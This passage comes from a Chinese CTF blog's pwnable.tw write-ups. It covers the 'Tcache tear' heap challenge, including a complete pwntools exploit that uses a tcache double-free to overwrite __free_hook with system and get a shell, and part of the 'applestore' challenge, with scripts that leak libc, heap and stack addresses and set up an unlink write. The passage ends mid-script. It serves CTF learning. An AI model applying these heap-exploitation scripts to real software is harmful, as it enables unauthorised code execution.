64位二进制程序，动态链接，去符号表\n- got表保护开启，got表不可写\n- 栈保护开启，栈不可执行，且有canary\n- 没有开启地址随机化\n\n## 1.2 IDA逆向源码逻辑\n\nmain中sub_400948()存在一个alarm定时函数，于是将它patch掉。（Edit --> Patch program -->Assemble，全部patch为nop）\n\n通过IDA分析Tcache tear的源码逻辑如下：\n\n![](tcachetear1.png)\n\n这里的漏洞点在num = 2的分支中，如下代码：\n\n```c\n if ( v4 <= 7 )\n      {\n        free(ptr);\n        ++v4;\n      }\n// free了全局变量ptr指向的堆内存，但并没有将该指针置NULL，导致悬空指针的产生。\n```\n\n本题采用的glibc 2.26 (ubuntu 17.10) 版本，为提升堆管理性能，舍弃了很多安全检查。如，对tcache而言，可以不间隔地free两个相同的堆，并添加到tcache链表中。\n\n本题中，控制Malloc的size在tcache范围内，执行如下命令可形成一个环：\n\n```c\nMalloc(size,data);\nfree();\nfree();\n```\n\n![](tcachetear2.png)\n\n下次malloc时，tcache将最右边的chunk返回给用户使用，用户可以更改其中的数据，如chunk的fd部分。那么当再一次malloc时，将右数第二个chunk（跟上一个实际是同一chunk）分配给用户。但此时由于fd被更改，下一次mallloc时，就会分配到fd中指定的地址。因此我们便可以在新地址中写一些数据，达到任意地址写的目的。\n\n接下来，我们触发一下这个漏洞试试，定个小目标，去修改全局变量0x602060处Global_name的值。\n\n\n\n## 1.3 漏洞触发 - 任意地址写\n\n初始化时，Global_name赋值为xiayuan，我的目标是把它改成wangyuxuan，代码如下：\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(p64(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.send('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.send('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.send('4')\n    \n# Global_name --> xiayuan\nmyproc.recvuntil('Name:')\nmyproc.sendline('xiayuan')\n\n# change Global_name --> wangyuxuan\nmy_malloc(200,'aaaaaaaaaa')\nmy_free()\nmy_free()\nmy_malloc(200,p64(0x602060))\nmy_malloc(200,'0')\nmy_malloc(200,'wangyuxuan')\n\ngdb.attach(myproc,'b * 0x00400c02 \\nc')\n\nmyproc.interactive()\n```\n\ngdb中查看Global_name处的值，成功被改\n\n```shell\ngef➤  x/s 0x602060\n0x602060:\t\"wangyuxuan\"\n```\n\n# 2 漏洞利用\n\n得到一个任意地址写的漏洞，我们通常有一下几种方式利用：\n\n- 修改函数指针\n- 修改got表\n- fini_array段函数指针\n- libc中的函数指针\n\n在本题中：\n\n- 程序没有自己的函数指针\n- got表不可写\n- 进入main函数后，一直处于while循环，不会执行到fini_array\n\n因此，我们只能去修改libc中的函数指针，需要：\n\n- 泄露libc基址\n- 利用libc中的函数指针\n\n## 2.1 泄露libc基址\n\n参考hacknote中，unsorted bin的特性。这里需要构造一个会被回收到unsorted bin中的chunk，然后将chunk中相应位置的数据（main_arena的top结构体）读出，减去它跟libc基址的偏移，就可以得到libc基址。\n\n一个又能被我们写，又能被我们读的位置，就是Global_name处。\n\nfree时除了检查当前块，还要检查nextchunk和nextchunk的nextchunk。因此总共需要构造三个块。\n\n大小分别为0x500（free时进入usorted bin）, 0x20, 0x20。且需要将他们的inuse位置1，以通过检查。\n\n- main_arena中top结构体距离libc基址的偏移：0x00007f762418fca0 - 0x00007f7623da4000 = 0x3ebca0\n\n![](tcachetear3.png)\n\n泄露libc地址的源码如下：\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(str(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('4')\n\nmyproc.recvuntil('Name:')\nmyproc.sendline(p64(0)+p64(0x501))\n\nmy_malloc(0x50,'a')\nmy_free()\nmy_free()\nmy_malloc(0x50,p64(0x602060 + 0x500))\nmy_malloc(0x50,'0')\nmy_malloc(0x50,(p64(0)+p64(0x21)+p64(0)+p64(0))*2)\n\nmy_malloc(0x70,'b')\nmy_free()\nmy_free()\nmy_malloc(0x70,p64(0x602060 + 0x10))\nmy_malloc(0x70,'0')\nmy_malloc(0x70,'b')\n\n# free, then get 'top' addr on 0x602060+0x10\nmy_free()\n\n# calc libc_addr\nmy_info()\nmyproc.recv('Name :')\nmyproc.recv(0x10)\nlibc_addr = u64(myproc.recv(0x8)) - 0x3ebca0\n\ngdb.attach(myproc,'b * 0x00400c02 \\nc')\n\nmyproc.interactive()\n```\n\n\n\n## 2.2 控制libc中的函数指针\n\nlibc中存在一些导出的hook函数指针：\n\n```shell\n$ strings libc-123.so | grep hook\n__malloc_initialize_hook\n_dl_open_hook\nargp_program_version_hook\n__after_morecore_hook\n__memalign_hook\n__malloc_hook\n__free_hook\n_dl_open_hook2\n__realloc_hook\n```\n\n[malloc hook初探](https://www.jianshu.com/p/0d7aa3166eec)\n\n根据这些hook函数的特性（malloc之前会调用`__malloc_hook`，free之前会调用`__free_hook`），我们可以劫持这些函数指针，来执行system函数或者one_gadget。\n\n```shell\n$ one_gadget libc-123.so \n0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0x4f322 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  [rsp+0x40] == NULL\n\n0x10a38c execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n# 3 EXP\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmylibc = ELF('libc-123.so')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(str(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('4')\n\nmyproc.recvuntil('Name:')\nmyproc.sendline(p64(0)+p64(0x501))\n\nmy_malloc(0x50,'a')\nmy_free()\nmy_free()\nmy_malloc(0x50,p64(0x602060 + 0x500))\nmy_malloc(0x50,'0')\nmy_malloc(0x50,(p64(0)+p64(0x21)+p64(0)+p64(0))*2)\n\nmy_malloc(0x70,'b')\nmy_free()\nmy_free()\nmy_malloc(0x70,p64(0x602060 + 0x10))\nmy_malloc(0x70,'0')\nmy_malloc(0x70,'b')\n\n# free, then get 'top' addr on 0x602060+0x10\nmy_free()\n\n# calc libc_addr\nmy_info()\nmyproc.recvuntil('Name :')\nmyproc.recv(0x10)\nlibc_addr = u64(myproc.recv(0x8)) - 0x3ebca0\n\n# hijack __free_hook\nfree_hook = libc_addr + mylibc.symbols['__free_hook']\nsystem_addr = libc_addr + mylibc.symbols['system']\n# 1、将free_hook所在地址的值覆盖为system函数的地址值\nmy_malloc(0x90,'b')\nmy_free()\nmy_free()\nmy_malloc(0x90,p64(free_hook))\nmy_malloc(0x90,'0')\nmy_malloc(0x90,p64(system_addr))\n# 2、使void *ptr指向“/bin/sh”，后续free(ptr)时相当于执行system(\"/bin/sh\")\nmy_malloc(0x80,'/bin/sh\\x00')\n\nmy_free()\n# gdb.attach(myproc,'b * 0x00400c02 \\nc')\nmyproc.interactive()\n```\n\n\n\n\n\n\n\n\n\n\n\n","tags":["heap","tcache"],"categories":["CTF"]},{"title":"pwnable.tw之applestore","url":"/2020/03/07/applestore/","content":"\n[applestore题目链接](https://pwnable.tw/challenge/#7)\n\n这是一道我看着看着想哭的题目，真的太绕了。\n\n# 1 分析\n\n## 1.1 linux下查看二进制信息\n\n```shell\n$ file applestore\napplestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped\n\n$ checksec applestore\n[*] '/mnt/hgfs/vmshare/applestore/applestore'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n可以得到如下信息：\n\n- 32位二进制程序，动态链接，没有去符号表\n- got表可写\n- 开启栈不可执行，并有canary\n- 没有开启地址随机化\n\n## 1.2 IDA逆向源码逻辑\n\nmain函数中，前两个函数时设置超时的，60秒程序就timeout了。\n\n- memset将全局变量mycart的16个字节全部初始化为0。\n- menu函数中做一些信息打印。从代码中可以看到，有6个选项。\n- handler函数中会进行一些处理。其中handler函数是重点，接下来我们对其中的每个函数详细分析。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  signal(14, timeout);\n  alarm(0x3Cu);\n  memset(&myCart, 0, 0x10u);\n  menu();\n  return handler();\n}\n\nint menu()\n{\n  puts(\"=== Menu ===\");\n  printf(\"%d: Apple Store\\n\", 1);\n  printf(\"%d: Add into your shopping cart\\n\", 2);\n  printf(\"%d: Remove from your shopping cart\\n\", 3);\n  printf(\"%d: List your shopping cart\\n\", 4);\n  printf(\"%d: Checkout\\n\", 5);\n  return printf(\"%d: Exit\\n\", 6);\n}\n\nunsigned int handler()\n{\n  char which_phone; // [esp+16h] [ebp-22h]\n  unsigned int v2; // [esp+2Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  while ( 1 )\n  {\n    printf(\"> \");\n    fflush(stdout);\n    my_read(&which_phone, 0x15u);\n    switch ( atoi(&which_phone) )\n    {\n      case 1:\n        list();                                 // apple store\n        break;\n      case 2:\n        add();                                  // Add into your shopping cart\n        break;\n      case 3:\n        delete();                               // Remove from your shopping cart\n        break;\n      case 4:\n        cart();                                 // List your shopping cart\n        break;\n      case 5:\n        checkout();                             // Checkout\n        break;\n      case 6:\n        puts(\"Thank You for Your Purchase!\");   // Exit\n        return __readgsdword(0x14u) ^ v2;\n      default:\n        puts(\"It's not a choice! Idiot.\");\n        break;\n    }\n  }\n}\n```\n\n### 1.2.1 list\n\n这个函数没什么好关注的，就是很多条打印信息，将苹果商店里有的商品及价格展示给我们。\n\n```c\nint list()\n{\n  puts(\"=== Device List ===\");\n  printf(\"%d: iPhone 6 - $%d\\n\", 1, 199);\n  printf(\"%d: iPhone 6 Plus - $%d\\n\", 2, 299);\n  printf(\"%d: iPad Air 2 - $%d\\n\", 3, 499);\n  printf(\"%d: iPad Mini 3 - $%d\\n\", 4, 399);\n  return printf(\"%d: iPod Touch - $%d\\n\", 5, 199);\n}\n```\n\n### 1.2.2 add\n\nadd函数的主要逻辑是将我们选择的商品添加进购物车。此函数看上去比较多，涉及5个case分支。实际只需关注create和insert两个函数功能。\n\n```c\nunsigned int add()\n{\n  _DWORD *v1; // [esp+1Ch] [ebp-2Ch]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v3; // [esp+3Ch] [ebp-Ch]\n\n  v3 = __readgsdword(0x14u);\n  printf(\"Device Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  switch ( atoi(&nptr) )\n  {\n    case 1:\n      v1 = (_DWORD *)create(\"iPhone 6\", 199);\n      insert(v1);\n      goto LABEL_8;\n    case 2:\n      v1 = (_DWORD *)create(\"iPhone 6 Plus\", 299);\n      insert(v1);\n      goto LABEL_8;\n    case 3:\n      v1 = (_DWORD *)create(\"iPad Air 2\", 499);\n      insert(v1);\n      goto LABEL_8;\n    case 4:\n      v1 = (_DWORD *)create(\"iPad Mini 3\", 399);\n      insert(v1);\n      goto LABEL_8;\n    case 5:\n      v1 = (_DWORD *)create(\"iPod Touch\", 199);\n      insert(v1);\nLABEL_8:\n      printf(\"You've put *%s* in your shopping cart.\\n\", *v1);\n      puts(\"Brilliant! That's an amazing idea.\");\n      break;\n    default:\n      puts(\"Stop doing that. Idiot!\");\n      break;\n  }\n  return __readgsdword(0x14u) ^ v3;\n}\n```\n\n#### 1.2.2.1 create\n\ncreate函数中申请一个16字节大小的堆，并将该堆块分成4份。第0~3字节存放asprintf申请的堆空间地址（该新申请的堆中存放的是手机型号的字符串）。第4~7字节存放手机的价格。剩余8个字节目前存放的是0。随后将这个堆块的地址返回给上一层，上一层将该地址传递给insert。\n\n```c\nchar **__cdecl create(int p_type, char *p_money)\n{\n  char **v2; // eax MAPDST\n\n  v2 = (char **)malloc(0x10u);\n  v2[1] = p_money;\n  asprintf(v2, \"%s\", p_type);\n  v2[2] = 0;\n  v2[3] = 0;\n  return v2;\n}\n```\n\ncreate的堆块和asprintf生成的堆块关系如下图：\n\n![](applestore-1.png)\n\n#### 1.2.2.2 insert\n\ninsert函数中，将上一步的堆块和全局变量mycart连接起来，组成如下图1.2.2.2-1的关系。\n\n```c\nint *__cdecl insert(int *info_loc)\n{\n  int *result; // eax\n  _DWORD *i; // [esp+Ch] [ebp-4h]\n\n  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )\n    ;\n  i[2] = info_loc;\n  result = info_loc;\n  info_loc[3] = (int)i;\n  return result;\n}\n```\n\n图1.2.2.2-1\n\n![](applestore-2.png)\n\n当add第二部手机进购物车的时候，就会生成如图1.2.2.2-2的关系：\n\n![](applestore-3.png)\n\n可以看出，添加进购物车的手机信息都被串成了双链表的形式。因此后续的delete和cart就是双链表删除和遍历的操作。\n\n### 1.2.3 delete\n\ndelete函数的功能主要是，根据我们输入的编号，将购物车中对应的商品删除。\n\n```c\nunsigned int delete()\n{\n  signed int v1; // [esp+10h] [ebp-38h]\n  _DWORD *v2; // [esp+14h] [ebp-34h]\n  int v3; // [esp+18h] [ebp-30h]\n  int v4; // [esp+1Ch] [ebp-2Ch]\n  int v5; // [esp+20h] [ebp-28h]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v7; // [esp+3Ch] [ebp-Ch]\n\n  v7 = __readgsdword(0x14u);\n  v1 = 1;\n  v2 = (_DWORD *)dword_804B070;\n  printf(\"Item Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  v3 = atoi(&nptr);\n  while ( v2 )\n  {\n    if ( v1 == v3 )\n    {\n      v4 = v2[2];\n      v5 = v2[3];\n      if ( v5 )\n        *(_DWORD *)(v5 + 8) = v4;\n      if ( v4 )\n        *(_DWORD *)(v4 + 12) = v5;\n      printf(\"Remove %d:%s from your shopping cart.\\n\", v1, *v2);\n      return __readgsdword(0x14u) ^ v7;\n    }\n    ++v1;\n    v2 = (_DWORD *)v2[2];\n  }\n  return __readgsdword(0x14u) ^ v7;\n}\n```\n\n### 1.2.4 cart\n\ncart函数的功能是打印我们购物车中已经存在的商品，并且计算购物车中商品的总额，最后将总额返回。\n\n```c\nint cart()\n{\n  signed int v0; // eax\n  signed int v2; // [esp+18h] [ebp-30h]\n  int v3; // [esp+1Ch] [ebp-2Ch]\n  _DWORD *i; // [esp+20h] [ebp-28h]\n  char buf; // [esp+26h] [ebp-22h]\n  unsigned int v6; // [esp+3Ch] [ebp-Ch]\n\n  v6 = __readgsdword(0x14u);\n  v2 = 1;\n  v3 = 0;\n  printf(\"Let me check your cart. ok? (y/n) > \");\n  fflush(stdout);\n  my_read(&buf, 0x15u);\n  if ( buf == 'y' )\n  {\n    puts(\"==== Cart ====\");\n    for ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[2] )\n    {\n      v0 = v2++;\n      printf(\"%d: %s - $%d\\n\", v0, *i, i[1]);\n      v3 += i[1];\n    }\n  }\n  return v3;\n}\n```\n\n### 1.2.5 checkout\n\ncheckout函数，顾名思义，就是结账的地方。不过这里不管你买多少，都只会输出让你下次再结账的提示。\n\n不过我们可以看到，这里有个if分支。当cart的返回值（购物总价值）为7174美元时，就会弹出一个\"一美元买iphone 8\"的提示。并且调用了asprintf和insert两个函数，将一美元的iphone加入购物车列表中，最后将购物车总价值改为7175.\n\n```c\nunsigned int checkout()\n{\n  int v1; // [esp+10h] [ebp-28h]\n  char *v2; // [esp+18h] [ebp-20h]\n  int v3; // [esp+1Ch] [ebp-1Ch]\n  unsigned int v4; // [esp+2Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  v1 = cart();\n  if ( v1 == 7174 )\n  {\n    puts(\"*: iPhone 8 - $1\");\n    asprintf(&v2, \"%s\", \"iPhone 8\");\n    v3 = 1;\n    insert(&v2);\n    v1 = 7175;\n  }\n  printf(\"Total: $%d\\n\", v1);\n  puts(\"Want to checkout? Maybe next time!\");\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\n这里有一个很奇怪的点，跟add函数中添加一部手机的操作不一样。\n\n- add函数中是申请一块堆内存用于存放加入购物车的手机信息\n- 而iphone 8的信息是存在栈空间V2处的，而这个V2又会被加入到之前的链表中。因此一个栈空间地址被写入了堆中，而栈是不断在变化的，因此就出现了一段可能被控制的内存，即V2附近。\n\n由以上代码中的信息，我们可以得到如下图所示栈空间的布局：\n\n![](applestore-4.png)\n\n#### 漏洞点\n\n> checkout里存放在栈上的iphone 8信息就是本题的漏洞点，因为栈的地址被写入了堆中。\n\n这段栈空间在checkout函数返回后，会被其他函数使用。因此堆中指向的栈空间信息是可能被我们任意更改的。\n\n而本题恰好给我们提供了两个函数：cart和delete，分别用于打印和删除（在链表中执行unlink操作时即任意地址写），可以被我们利用来泄露信息和任意地址写限定值（或限定地址写任意值）。\n\n## 1.3 触发漏洞\n\n为了触发漏洞，必须使checkout的iphone 8分支被执行。也就是在执行checkout之前，我们必须add够正好7174美元的手机。手机有4种价格：199, 299, 399, 499。那么怎么搭配这四种价格凑齐7174美元，就需要使用各自的方法了。这里提供几种途径：\n\n- Z3求解器\n- matlab\n- wolf mathematics\n- 靠各位的智力脑算+手算...\n\n这里借用一下我男票算到的结果：6 * 199 + 20 * 299 = 7174\n\n触发脚本如下：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('>',op)\n    myps.sendlineafter('>',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\nmyps.recv()\nmyps.interactive()\n```\n\n执行该脚本，得到如下结果，进入了1美元买iphone8的分支：\n\n```shell\n20: iPhone 6 Plus - $299\n21: iPhone 6 Plus - $299\n22: iPhone 6 Plus - $299\n23: iPhone 6 Plus - $299\n24: iPhone 6 Plus - $299\n25: iPhone 6 Plus - $299\n26: iPhone 6 Plus - $299\n*: iPhone 8 - $1\nTotal: $7175\nWant to checkout? Maybe next time!\n> $  \n```\n\n此时，程序回到了handler分支，checkout的函数栈已经被释放，因此iphone 8的栈空间接下来可能存在两种可能：\n\n- 1、这段栈空间的值没被覆盖，那么iphone 8 的栈块信息是还在的，此时查看链表或者删除链表中该项也许不会有问题。（没有尝试）\n- 2、这段栈空间被分配给了新函数，并且新函数覆盖上了新值。那么此时对整个链表进行查看或删除iphone 8这一项时，就会出现问题。\n\n我们执行4（cart查看购物车），等于将刚刚chekout的栈分配给了cart函数。那么就会出现如下错误（如果使用delete删除最后一项，也会出错）：\n\n```shell\nTotal: $7175\nWant to checkout? Maybe next time!\n> $ 4\n[DEBUG] Sent 0x2 bytes:\n    '4\\n'\n[DEBUG] Received 0x24 bytes:\n    'Let me check your cart. ok? (y/n) > '\nLet me check your cart. ok? (y/n) > $ y\n······\n20: iPhone 6 Plus - $299\n21: iPhone 6 Plus - $299\n22: iPhone 6 Plus - $299\n23: iPhone 6 Plus - $299\n24: iPhone 6 Plus - $299\n25: iPhone 6 Plus - $299\n26: iPhone 6 Plus - $299\n27: �f\\x89p\\x0c\\x89x\\x0e\\x05- $-136495008\n[*] Got EOF while reading in interactive\n$  \n```\n\n出错的原因是，iphone8相关的数据都存在栈上，在checkout函数退出后，栈上的数据被cart函数的局部变量覆盖。导致cart中遍历访问链表时，访问到iphone 8时访问了非法的地址。\n\n# 2 利用\n\n1.2.5节漏洞点中阐述了这个漏洞可以用来泄露信息以及有约束地写。\n\n- 1、如果我们把iphone 8数据所在的栈空间覆盖为构造的特定数据，就可以打印（泄露）我们想要的内容。比如说libc。（后面需要用到堆地址，所以这里还需泄露堆、以及栈空间的地址）\n- 2、有约束地写，由于got表可写，因此我们一定是利用这个任意地址写去覆写got表项。\n\n## 2.1 信息泄露- cart\n\n如下图所示，精心布置cart函数的栈帧，控制ebp-0x20处连续16个字节的值（在IDA中查看cart函数的伪码可知，ebp-0x20 ~ ebp-0x10空间是输入buf，可控）。如图中红色栈块所示，cart函数打印到栈上的块时，会将got表中puts函数的地址打印出来。并且由于fd不为空，会继续以mycart偏移8字节处作为一个新块，去打印info_loc的地址，此时就将堆的地址泄露出来了（当然也可以像泄露puts地址一样，去泄露堆地址）。\n\n利用泄露puts函数地址的方法，可以逐步泄露其他信息。\n\n![](applestore-5.png)\n\n### 2.1.1 泄露libc和堆地址\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4))\n##修正heap地址\n#heap_addr = u32(myps.recv(44)) - 0x490\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\n\ngdb.attach(myps,'b * 0x08048BEB')\nmyps.interactive()\n```\n\n打印出的两个地址如下：\n\n```shell\n[!] libc_addr:0xf7d5a000\n[!] heap_addr:0x830c490\n```\n\n在执行脚本过程中弹出的gdb调试终端框中，执行vmmap，查看libc的起始地址为0xf7d5a000。使用heap chunks查看第一个堆的地址（0x830c008 - 0x8 = 0x830c000），并对上述打印的堆地址修正（0x830c000 = 0x830c490 - 0x490，已更改到上述代码中）：\n\n```bash\ngef➤  vmmap\nStart      End        Offset     Perm Path\n0xf7d5a000 0xf7f07000 0x00000000 r-x /lib32/libc-2.23.so\n0xf7f07000 0xf7f08000 0x001ad000 --- /lib32/libc-2.23.so\n0xf7f08000 0xf7f0a000 0x001ad000 r-- /lib32/libc-2.23.so\n0xf7f0a000 0xf7f0b000 0x001af000 rw- /lib32/libc-2.23.so\n\ngef➤  heap chunks\nChunk(addr=0x830c008, size=0x408, flags=PREV_INUSE)\n    [0x0830c008     3e 20 3a 20 90 c4 30 08 c7 20 2d 20 24 30 0a 08    > : ..0.. - $0..]\nChunk(addr=0x830c410, size=0x18, flags=PREV_INUSE)\n    [0x0830c410     90 c4 30 08 c7 00 00 00 28 c4 30 08 68 b0 04 08    ..0.....(.0.h...]\nChunk(addr=0x830c428, size=0x18, flags=PREV_INUSE)\n    [0x0830c428     40 c4 30 08 c7 00 00 00 50 c4 30 08 10 c4 30 08    @.0.....P.0...0.]\nChunk(addr=0x830c440, size=0x10, flags=PREV_INUSE)\n    [0x0830c440     69 50 68 6f 6e 65 20 36 00 00 00 00 19 00 00 00    iPhone 6........]\n```\n\n### 2.1.2 泄露栈地址\n\n第26个节点的fd中存放的是第27个节点的地址（即栈中某个地址）。\n\n接着在1.3.1节中弹出的gdb调试框中，打印esp和ebp的值，分别为0xfffd4038和0xfffd4078。由此我们推测栈空间的地址应该是由0xfffd开头的，然后去打印出的堆chunks中寻找\"fd ff\"字样。仅在addr=0x830c8a8的chunk中找到一个\"0xfffd4058\"，这就是一个栈空间的地址。那么该地址值距离堆起始地址的偏移是0x830c8a8 + 0x8 - 0x830c000 = 0x8b0：\n\n```shell\nChunk(addr=0x830c890, size=0x18, flags=PREV_INUSE)\n    [0x0830c890     10 c9 30 08 2b 01 00 00 a8 c8 30 08 40 c8 30 08    ..0.+.....0.@.0.]\nChunk(addr=0x830c8a8, size=0x18, flags=PREV_INUSE)\n    [0x0830c8a8     c0 c8 30 08 2b 01 00 00 58 40 fd ff 90 c8 30 08    ..0.+...X@....0.]\nChunk(addr=0x830c8c0, size=0x18, flags=PREV_INUSE)\n    [0x0830c8c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x830c8d8, size=0x10, flags=PREV_INUSE)\n    [0x0830c8d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]\nChunk(addr=0x830c8e8, size=0x28, flags=PREV_INUSE)\n    [0x0830c8e8     b0 a7 f0 f7 b0 a7 f0 f7 00 00 00 00 11 07 02 00    ................]\nChunk(addr=0x830c910, size=0x18, flags=)\n    [0x0830c910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x830c928, size=0x206e0, flags=PREV_INUSE)  ←  top chunk\ngef➤  p $esp\n$1 = (void *) 0xfffd4038\ngef➤  p $ebp\n$2 = (void *) 0xfffd4078\n```\n\n由上述内容可知，我们想要的栈空间地址在堆起始地址heap_addr+0x8b0处。因此在2.1.1的python代码中再添加一步，就可以泄露栈空间地址：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\nlog.warn('satck_addr:0x%x' % stack_addr)\n\ngdb.attach(myps,'b * 0x08048BEB')\nmyps.interactive()\n```\n\n得到如下结果：\n\n```shell\n[!] libc_addr:0xf7d48000\n[!] heap_addr:0x9603000\n[!] satck_addr:0xffb3e518\n===========================================================\nChunk(addr=0x9603890, size=0x18, flags=PREV_INUSE)\n    [0x09603890     10 39 60 09 2b 01 00 00 a8 38 60 09 40 38 60 09    .9`.+....8`.@8`.]\nChunk(addr=0x96038a8, size=0x18, flags=PREV_INUSE)\n    [0x096038a8     c0 38 60 09 2b 01 00 00 18 e5 b3 ff 90 38 60 09    .8`.+........8`.]\nChunk(addr=0x96038c0, size=0x18, flags=PREV_INUSE)\n    [0x096038c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x96038d8, size=0x10, flags=PREV_INUSE)\n    [0x096038d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]\nChunk(addr=0x96038e8, size=0x28, flags=PREV_INUSE)\n    [0x096038e8     b0 87 ef f7 b0 87 ef f7 00 00 00 00 11 07 02 00    ................]\nChunk(addr=0x9603910, size=0x18, flags=)\n    [0x09603910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x9603928, size=0x206e0, flags=PREV_INUSE)  ←  top chunk\ngef➤  p $esp\n$1 = (void *) 0xffb3e4f8\ngef➤  p $ebp\n$2 = (void *) 0xffb3e538\n```\n\n## 2.2 任意地址写 - delete\n\n以下图为例，假如我们要删除info_loc_1这个堆块，则必须执行如下几条命令，将其从链表中拆除：\n\n```c\ninfo_loc_2.bk = info_loc_1.bk\ninfo_loc.fd = info_loc_1.fd\n```\n\n如果只用当前要被删除的项info_loc_1来表示，相当于：\n\n```c\ninfo_loc_1.fd[3] = info_loc_1.bk\ninfo_loc_a.bk[2] = info_loc_1.fd\n//简写为:\nfd[3] = bk\nbk[2] = fd\n```\n\n![](applestore-6.png)\n\n如下图，可以形象地描述任意地址写的两种情况，实际利用使选择任何一种都可。\n\n![](applestore-7.png)\n\n### 2.2.1 泄露ebp地址\n\n下面验证一下handler下的函数在被调用时，其ebp是一样的：\n\n```python\nfrom pwn import 